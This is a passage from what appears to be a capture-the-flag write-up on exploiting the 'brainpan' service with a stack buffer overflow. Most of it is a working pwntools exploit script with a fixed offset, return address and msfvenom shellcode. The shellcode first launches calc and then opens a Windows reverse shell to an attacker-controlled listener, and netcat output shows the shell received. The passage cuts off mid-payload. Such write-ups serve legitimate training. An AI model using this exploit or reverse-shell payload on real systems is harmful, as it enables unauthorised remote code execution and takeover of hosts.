</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xae\xbb\x5c\x63\xa5\xe5\x7e\x85\x6a\x9e\x36\x9d&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x6f\x9b\x81\x16\x5b\x57\x10\xff\x92\x98\xbf\x3e&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x1b\x6b\xc1\x07\x9b\x94\xb4\x71\xd8\x29\xcf\x45&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xa3\xf5\x5a\x5e\x03\x7d\xfc\xba\xb2\x52\x9b\x49&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xb8\x1f\xef\x16\xdc\x9e\x3c\x2d\xd8\x2b\xc3\xe2&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x69\x6f\xe0\x26\x32\x2b\x89\x7f\x9e\x9a\xb6\x60&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x41\x42\x13\xea\x6f\x97\x2e\xb1\xe5\x66\xbc\xcf&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x4b\x68\xbe\xcf\xfb\x01\x8f\x44\x94\x56\x10\x8f&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xd1\xa9\x5a\x92\x73\x22\x03\x46\xc6\x2f\xb4\xbc&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x04\x56\x37\x35\xf4\xad\x27\x3c\xf1\xea\xef\xac&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x8b\x63\x9a\xd2\x38\x83\x8f\xb0\xdf\x17\x53\x19&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x7a\x90\xf6\x65&#34;</span>
</span></span></code></pre></div><p>I then updated the padding variable to provide 16 bytes of nop instructions for the payload to destroy if it needed to decode any of these instructions.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>padding <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;x90&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
</span></span></code></pre></div><p>With these generated, I had my first full exploit for the brainpan service.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># context vars</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># target</span>
</span></span><span style=display:flex><span>target <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;192.168.0.14&#39;</span>, <span style=color:#ae81ff>9999</span>, typ<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;tcp&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># target-specific vars</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># payload vars</span>
</span></span><span style=display:flex><span>total_payload_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>524</span>
</span></span><span style=display:flex><span>overflow <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> offset
</span></span><span style=display:flex><span>retn <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf3\x12\x17\x31</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>padding <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>bad_chars <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#root@kali:~/ctf# msfvenom -p windows/exec CMD=calc.exe -b &#34;x00&#34; -f python -v payload | sed &#39;s/b&#34;/&#34;/&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span>  <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xda\xdf\xd9\x74\x24\xf4\x5b\xba\xea\x73\x0c\xc9</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x31\xc9\xb1\x31\x83\xc3\x04\x31\x53\x14\x03\x53</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xfe\x91\xf9\x35\x16\xd7\x02\xc6\xe6\xb8\x8b\x23</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xd7\xf8\xe8\x20\x47\xc9\x7b\x64\x6b\xa2\x2e\x9d</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf8\xc6\xe6\x92\x49\x6c\xd1\x9d\x4a\xdd\x21\xbf</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xc8\x1c\x76\x1f\xf1\xee\x8b\x5e\x36\x12\x61\x32</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xef\x58\xd4\xa3\x84\x15\xe5\x48\xd6\xb8\x6d\xac</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xae\xbb\x5c\x63\xa5\xe5\x7e\x85\x6a\x9e\x36\x9d</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x6f\x9b\x81\x16\x5b\x57\x10\xff\x92\x98\xbf\x3e</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1b\x6b\xc1\x07\x9b\x94\xb4\x71\xd8\x29\xcf\x45</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xa3\xf5\x5a\x5e\x03\x7d\xfc\xba\xb2\x52\x9b\x49</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb8\x1f\xef\x16\xdc\x9e\x3c\x2d\xd8\x2b\xc3\xe2</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x69\x6f\xe0\x26\x32\x2b\x89\x7f\x9e\x9a\xb6\x60</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x41\x42\x13\xea\x6f\x97\x2e\xb1\xe5\x66\xbc\xcf</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x4b\x68\xbe\xcf\xfb\x01\x8f\x44\x94\x56\x10\x8f</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xd1\xa9\x5a\x92\x73\x22\x03\x46\xc6\x2f\xb4\xbc</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x04\x56\x37\x35\xf4\xad\x27\x3c\xf1\xea\xef\xac</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x8b\x63\x9a\xd2\x38\x83\x8f\xb0\xdf\x17\x53\x19</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x7a\x90\xf6\x65</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>postfix <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;C&#34;</span> <span style=color:#f92672>*</span> (total_payload_size <span style=color:#f92672>-</span> offset <span style=color:#f92672>-</span> len(retn) <span style=color:#f92672>-</span> len(padding) <span style=color:#f92672>-</span> len(payload))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>buffer <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join([
</span></span><span style=display:flex><span>    overflow,
</span></span><span style=display:flex><span>    retn,
</span></span><span style=display:flex><span>    padding,
</span></span><span style=display:flex><span>    payload,
</span></span><span style=display:flex><span>    postfix
</span></span><span style=display:flex><span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># send exploit</span>
</span></span><span style=display:flex><span><span style=color:#75715e># sending payload</span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;&gt;&gt; &#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;sending payload of </span><span style=color:#e6db74>{</span>len(buffer)<span style=color:#e6db74>}</span><span style=color:#e6db74> bytes&#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(buffer)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># cleanup</span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
</span></span></code></pre></div><p>I executed the new payload and was pleased to confirm that I had RCE.</p><p><p class=markdown-image><img src=/images/brainpan_pop_calc.png alt="pop calc"></p></p><h4 id=generating-a-test-shell-payload>Generating a test shell payload <a href=#generating-a-test-shell-payload class=anchor>üîó</a></h4><p>Now that I had code execution, I needed shellcode that performed a more useful action than opening a calculator on my desktop. I generated a reverse shell to my local test environment similarly to how I had generated the <code>cmd/exec</code> shellcode.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# msfvenom -p windows/shell_reverse_tcp LHOST<span style=color:#f92672>=</span>192.168.0.13 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span> -v payload -b <span style=color:#e6db74>&#39;\x00&#39;</span> -f python | sed <span style=color:#e6db74>&#39;s/b&#34;/&#34;/&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span style=display:flex><span>Found <span style=color:#ae81ff>11</span> compatible encoders
</span></span><span style=display:flex><span>Attempting to encode payload with <span style=color:#ae81ff>1</span> iterations of x86/shikata_ga_nai
</span></span><span style=display:flex><span>x86/shikata_ga_nai succeeded with size <span style=color:#ae81ff>351</span> <span style=color:#f92672>(</span>iteration<span style=color:#f92672>=</span>0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>x86/shikata_ga_nai chosen with final size <span style=color:#ae81ff>351</span>
</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>351</span> bytes
</span></span><span style=display:flex><span>Final size of python file: <span style=color:#ae81ff>1869</span> bytes
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span>  <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xba\x51\x1f\x1b\xee\xd9\xc4\xd9\x74\x24\xf4\x5d&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x33\xc9\xb1\x52\x31\x55\x12\x03\x55\x12\x83\xbc&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xe3\xf9\x1b\xc2\xf4\x7c\xe3\x3a\x05\xe1\x6d\xdf&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x34\x21\x09\x94\x67\x91\x59\xf8\x8b\x5a\x0f\xe8&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x18\x2e\x98\x1f\xa8\x85\xfe\x2e\x29\xb5\xc3\x31&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xa9\xc4\x17\x91\x90\x06\x6a\xd0\xd5\x7b\x87\x80&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x8e\xf0\x3a\x34\xba\x4d\x87\xbf\xf0\x40\x8f\x5c&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x40\x62\xbe\xf3\xda\x3d\x60\xf2\x0f\x36\x29\xec&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x4c\x73\xe3\x87\xa7\x0f\xf2\x41\xf6\xf0\x59\xac&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x36\x03\xa3\xe9\xf1\xfc\xd6\x03\x02\x80\xe0\xd0&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x78\x5e\x64\xc2\xdb\x15\xde\x2e\xdd\xfa\xb9\xa5&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xd1\xb7\xce\xe1\xf5\x46\x02\x9a\x02\xc2\xa5\x4c&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x83\x90\x81\x48\xcf\x43\xab\xc9\xb5\x22\xd4\x09&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x16\x9a\x70\x42\xbb\xcf\x08\x09\xd4\x3c\x21\xb1&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x24\x2b\x32\xc2\x16\xf4\xe8\x4c\x1b\x7d\x37\x8b&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x5c\x54\x8f\x03\xa3\x57\xf0\x0a\x60\x03\xa0\x24&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x41\x2c\x2b\xb4\x6e\xf9\xfc\xe4\xc0\x52\xbd\x54&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xa1\x02\x55\xbe\x2e\x7c\x45\xc1\xe4\x15\xec\x38&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x6f\xda\x59\x42\x62\xb2\x9b\x42\x6d\x1e\x15\xa4&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xe7\x8e\x73\x7f\x90\x37\xde\x0b\x01\xb7\xf4\x76&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x01\x33\xfb\x87\xcc\xb4\x76\x9b\xb9\x34\xcd\xc1&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x6c\x4a\xfb\x6d\xf2\xd9\x60\x6d\x7d\xc2\x3e\x3a&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x2a\x34\x37\xae\xc6\x6f\xe1\xcc\x1a\xe9\xca\x54&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xc1\xca\xd5\x55\x84\x77\xf2\x45\x50\x77\xbe\x31&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x0c\x2e\x68\xef\xea\x98\xda\x59\xa5\x77\xb5\x0d&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x30\xb4\x06\x4b\x3d\x91\xf0\xb3\x8c\x4c\x45\xcc&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x21\x19\x41\xb5\x5f\xb9\xae\x6c\xe4\xc9\xe4\x2c&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x4d\x42\xa1\xa5\xcf\x0f\x52\x10\x13\x36\xd1\x90&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xec\xcd\xc9\xd1\xe9\x8a\x4d\x0a\x80\x83\x3b\x2c&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x37\xa3\x69&#34;</span>
</span></span></code></pre></div><p>Again, I replaced the previous shellcode with the above payload before opening up a netcat listener on my local desktop. Upon running the exploit, I was happy to see that my listener caught a shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~&gt; nc -lvnp <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>Listening on 0.0.0.0 <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>Connection received on 192.168.0.14 <span style=color:#ae81ff>49162</span>
</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>Version 6.1.7601<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\c</span>b<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\v</span>ulns<span style=color:#ae81ff>\b</span>rainpan&gt;
</span></span></code></pre></div><p>With a completed exploit I had everything I needed to move on to the real host.</p><h3 id=getting-a-shell-on-the-target>Getting a shell on the target <a href=#getting-a-shell-on-the-target class=anchor>üîó</a></h3><p>I needed to make a few changes to prepare my shell for my non-lab target. I started by updating the target variable in my exploit to reflect the IP of the lab instance <code>10.10.42.127</code> and then regenerated my reverse shell payload to connect back to my attack host. The finalized exploit with these changes looked like.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># context vars</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># target</span>
</span></span><span style=display:flex><span>target <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;10.10.42.127&#39;</span>, <span style=color:#ae81ff>9999</span>, typ<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;tcp&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># target-specific vars</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># payload vars</span>
</span></span><span style=display:flex><span>total_payload_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>524</span>
</span></span><span style=display:flex><span>overflow <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> offset
</span></span><span style=display:flex><span>retn <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf3\x12\x17\x31</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>padding <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>bad_chars <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#root@kali:~/ctf# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.176.118 LPORT=4444 -v payload -b &#39;\x00&#39; -f python | sed &#39;s/b&#34;/&#34;/&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span>  <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xd9\xc2\xb8\x7f\xdc\xf2\x3e\xd9\x74\x24\xf4\x5a</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2b\xc9\xb1\x52\x31\x42\x17\x83\xea\xfc\x03\x3d</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xcf\x10\xcb\x3d\x07\x56\x34\xbd\xd8\x37\xbc\x58</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xe9\x77\xda\x29\x5a\x48\xa8\x7f\x57\x23\xfc\x6b</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xec\x41\x29\x9c\x45\xef\x0f\x93\x56\x5c\x73\xb2</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xd4\x9f\xa0\x14\xe4\x6f\xb5\x55\x21\x8d\x34\x07</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xfa\xd9\xeb\xb7\x8f\x94\x37\x3c\xc3\x39\x30\xa1</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x94\x38\x11\x74\xae\x62\xb1\x77\x63\x1f\xf8\x6f</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x60\x1a\xb2\x04\x52\xd0\x45\xcc\xaa\x19\xe9\x31</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x03\xe8\xf3\x76\xa4\x13\x86\x8e\xd6\xae\x91\x55</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xa4\x74\x17\x4d\x0e\xfe\x8f\xa9\xae\xd3\x56\x3a</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xbc\x98\x1d\x64\xa1\x1f\xf1\x1f\xdd\x94\xf4\xcf</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x57\xee\xd2\xcb\x3c\xb4\x7b\x4a\x99\x1b\x83\x8c</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x42\xc3\x21\xc7\x6f\x10\x58\x8a\xe7\xd5\x51\x34</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf8\x71\xe1\x47\xca\xde\x59\xcf\x66\x96\x47\x08</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x88\x8d\x30\x86\x77\x2e\x41\x8f\xb3\x7a\x11\xa7</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x12\x03\xfa\x37\x9a\xd6\xad\x67\x34\x89\x0d\xd7</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf4\x79\xe6\x3d\xfb\xa6\x16\x3e\xd1\xce\xbd\xc5</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb2\xfa\x4b\x75\x34\x93\x49\x75\xa8\x3f\xc7\x93</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xa0\xaf\x81\x0c\x5d\x49\x88\xc6\xfc\x96\x06\xa3</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x3f\x1c\xa5\x54\xf1\xd5\xc0\x46\x66\x16\x9f\x34</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x21\x29\x35\x50\xad\xb8\xd2\xa0\xb8\xa0\x4c\xf7</span><span style=color:#e6db74>&#34;</span>
